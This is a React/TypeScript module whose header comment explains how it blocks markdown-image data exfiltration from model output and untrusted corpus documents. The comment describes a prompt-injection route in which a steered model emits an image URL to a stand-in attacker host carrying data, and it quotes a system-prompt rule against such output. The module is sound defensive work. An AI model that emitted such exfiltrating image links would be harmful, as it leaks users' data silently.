/**
 * Exfil hygiene at the RENDER boundary - the client half of the
 * untrusted-corpus injection gate.
 *
 * The backend's system prompt already forbids the model from emitting markdown
 * images or context-bearing links: "that is how data leaks at render time".
 * That rule is an instruction, and an instruction is not a control. Whether a
 * leak actually happens is decided HERE, by whether this client turns
 * `![](https://attacker/p.png?d=...)` into an <img> the browser fetches on its
 * own. It did: react-markdown renders image syntax as a real <img> by default,
 * so a single emitted line would have made an outbound request carrying whatever
 * was in the URL, with no click and nothing visible to the user.
 *
 * Two distinct trigger paths, both covered by this one module:
 *   1. the model emits it (chat) - needs the model to be steered, which is what
 *      the answer-layer probe measures at 4/4;
 *   2. a human opens a document that contains it (the admin KB viewer) - needs
 *      no model at all, and the corpus legitimately holds untrusted and
 *      quarantine-released documents.
 *
 * The rule applied: never let retrieved or generated text cause an automatic
 * outbound request. Images are BLOCKED and shown as inert text rather than
 * silently dropped, because "a document tried to embed remote content" is
 * information the reader wants - the same reason the system prompt says to
 * report a suspicious URL as plain text. Links stay clickable, since following
 * one is a deliberate human act and answers legitimately cite sources, but they
 * carry noopener/noreferrer so the destination learns nothing for free.
 *
 * A native mobile client would not need this - it never fetches markdown image
 * syntax on its own - and a widget that assigns output with textContent is safe
 * because markdown never becomes HTML there at all. Neither is a reason to skip
 * this file; they are reasons this
 * file is the only place the gap existed.
 */
import React from 'react'

/** The visible stand-in for an image we refused to load. */
export function BlockedImage({ src, alt }: { src?: string; alt?: string }) {
  const label = alt ? `blocked remote image: ${alt}` : 'blocked remote image'
  return (
    <span
      data-testid="blocked-remote-image"
      className="inline-block rounded border border-amber-600/40 bg-amber-950/30 px-2 py-0.5 text-xs text-amber-300"
      title="Remote content is never loaded from retrieved or generated text"
    >
      [{label}] {src || '(no source)'}
    </span>
  )
}

/**
 * Links stay usable. noreferrer also strips the Referer header, so the
 * destination does not learn which page (or which answer) sent the visitor.
 */
export function SafeLink({
  href,
  children,
}: {
  href?: string
  children?: React.ReactNode
}) {
  return (
    <a href={href} target="_blank" rel="noopener noreferrer nofollow">
      {children}
    </a>
  )
}

/**
 * Spread this into every <ReactMarkdown components={...}> that renders model
 * output or corpus content. Merge site-specific renderers (code highlighting)
 * on top; do not replace img or a without re-reading the header above.
 */
export const SAFE_MARKDOWN_COMPONENTS = {
  img: BlockedImage,
  a: SafeLink,
}
